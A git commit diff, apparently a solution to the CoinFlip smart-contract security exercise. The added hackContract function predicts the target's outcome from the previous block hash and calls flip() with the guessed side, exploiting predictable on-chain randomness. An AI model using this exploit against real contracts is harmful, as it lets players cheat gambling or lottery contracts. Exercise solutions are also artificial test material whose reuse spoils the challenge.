d4a4572e9193e7a67535fed261c73b50c3920ade
Brian Grosso <bgro63@gmail.com>
2023-02-02 23:09:11 -0500

    coinflip hack

--- contracts/1. CoinFlip/AttackingCoinFlip.sol
+++ contracts/1. CoinFlip/AttackingCoinFlip.sol
@@ -3,13 +3,22 @@ pragma solidity ^0.8.9;
 import "./CoinFlip.sol";
 
 contract AttackingCoinFlip {
-    address public contractAddress;
+    CoinFlip private coinFlipContract;
+    uint256 private lastHash;
+    uint256 private constant FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
     constructor(address _contractAddress) {
-        contractAddress = _contractAddress;
+        coinFlipContract = CoinFlip(_contractAddress);
     }
 
     function hackContract() external {
         // Code me!
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        lastHash = blockValue;
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+        coinFlipContract.flip(side);
+
     }
 }
